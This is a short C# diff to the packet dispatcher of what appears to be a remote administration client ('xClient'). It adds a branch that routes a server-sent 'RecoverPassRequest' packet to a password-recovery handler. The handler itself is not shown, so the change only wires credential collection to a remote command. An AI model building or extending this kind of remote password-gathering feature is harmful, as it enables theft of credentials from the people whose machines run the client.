@@ -139,6 +139,10 @@ namespace xClient.Core.Packets
             {
                 ReverseProxyCommandHandler.HandleCommand(client, packet);
             }
+            else if (type == typeof(Core.Packets.ServerPackets.RecoverPassRequest))
+            {
+                CommandHandler.HandlePasswordRequest((Core.Packets.ServerPackets.RecoverPassRequest)packet, client);
+            }
         }
     }
 }
